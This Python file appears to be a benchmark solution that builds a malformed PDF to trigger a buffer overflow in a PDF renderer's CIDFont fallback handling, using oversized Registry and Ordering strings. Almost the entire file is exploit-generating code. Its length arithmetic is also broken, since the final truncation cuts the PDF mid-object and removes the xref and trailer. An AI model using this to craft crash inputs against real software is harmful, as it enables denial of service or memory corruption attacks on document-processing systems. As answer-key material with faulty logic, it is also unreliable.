import os
import tarfile
import tempfile
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground truth length is 80064 bytes
        # We need to create a PDF that triggers the CIDFont fallback buffer overflow
        # The vulnerability is in the fallback name construction: <Registry>-<Ordering>
        
        # Create a minimal PDF with a CIDFont that has extremely long Registry and Ordering strings
        # The total concatenated string should exceed the buffer size
        
        # Calculate string lengths to reach approximately 80064 bytes
        # We need to account for PDF structure overhead
        pdf_overhead = 1000  # Approximate overhead for PDF headers, objects, etc.
        target_content_length = 80064 - pdf_overhead
        
        # Split between Registry and Ordering (plus dash)
        # Make both strings roughly equal
        reg_length = target_content_length // 2
        ord_length = target_content_length - reg_length - 1  # -1 for the dash
        
        # Create the long strings
        registry_str = 'A' * reg_length
        ordering_str = 'B' * ord_length
        
        # Build the PDF
        pdf_parts = []
        
        # PDF header
        pdf_parts.append(b'%PDF-1.4\n')
        
        # Create a catalog object
        catalog_obj = b'1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj\n'
        pdf_parts.append(catalog_obj)
        
        # Create pages object
        pages_obj = b'2 0 obj\n<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>\nendobj\n'
        pdf_parts.append(pages_obj)
        
        # Create page object
        page_obj = b'''3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/Font <<
/F1 5 0 R
>>
>>
>>
endobj
'''
        pdf_parts.append(page_obj)
        
        # Create contents object (empty stream)
        contents_obj = b'''4 0 obj
<<
/Length 0
>>
stream
endstream
endobj
'''
        pdf_parts.append(contents_obj)
        
        # Create font object with vulnerable CIDFont
        # The key is the CIDSystemInfo with extremely long Registry and Ordering
        font_obj = f'''5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /ABCDEE+{registry_str}
/Encoding /Identity-H
/DescendantFonts [6 0 R]
>>
endobj
'''.encode('utf-8')
        pdf_parts.append(font_obj)
        
        # Create CIDFontType2 object with the vulnerable CIDSystemInfo
        cidfont_obj = f'''6 0 obj
<<
/Type /Font
/Subtype /CIDFontType2
/BaseFont /{registry_str}
/CIDSystemInfo <<
/Registry ({registry_str})
/Ordering ({ordering_str})
/Supplement 0
>>
/DW 1000
/W [0 [500]]
/FontDescriptor 7 0 R
>>
endobj
'''.encode('utf-8')
        pdf_parts.append(cidfont_obj)
        
        # Create font descriptor
        font_descriptor = b'''7 0 obj
<<
/Type /FontDescriptor
/FontName /TestFont
/Flags 4
/FontBBox [0 0 1000 1000]
/ItalicAngle 0
/Ascent 800
/Descent -200
/CapHeight 800
/StemV 80
>>
endobj
'''
        pdf_parts.append(font_descriptor)
        
        # Create xref table
        xref_offset = len(b''.join(pdf_parts))
        xref_table = []
        xref_table.append(b'xref\n')
        xref_table.append(b'0 8\n')
        xref_table.append(b'0000000000 65535 f \n')
        
        # Calculate object offsets
        offset = 0
        offsets = [0] * 8
        
        # Track offsets as we build
        current_offset = 0
        for i, part in enumerate(pdf_parts):
            if i == 0:
                offsets[0] = current_offset  # Actually object 0
            elif i >= 1 and i <= 7:  # Objects 1-7
                offsets[i] = current_offset
            current_offset += len(part)
        
        # Write xref entries for objects 1-7
        for i in range(1, 8):
            xref_table.append(f'{offsets[i]:010d} 00000 n \n'.encode('utf-8'))
        
        pdf_parts.extend(xref_table)
        
        # Create trailer
        trailer = f'''trailer
<<
/Size 8
/Root 1 0 R
>>
startxref
{xref_offset}
%%EOF
'''.encode('utf-8')
        pdf_parts.append(trailer)
        
        # Combine all parts
        pdf_bytes = b''.join(pdf_parts)
        
        # Ensure we're close to target length
        if len(pdf_bytes) < 80064:
            # Add padding if needed
            padding = b'\n' * (80064 - len(pdf_bytes))
            pdf_bytes += padding
        
        return pdf_bytes[:80064]  # Ensure exact length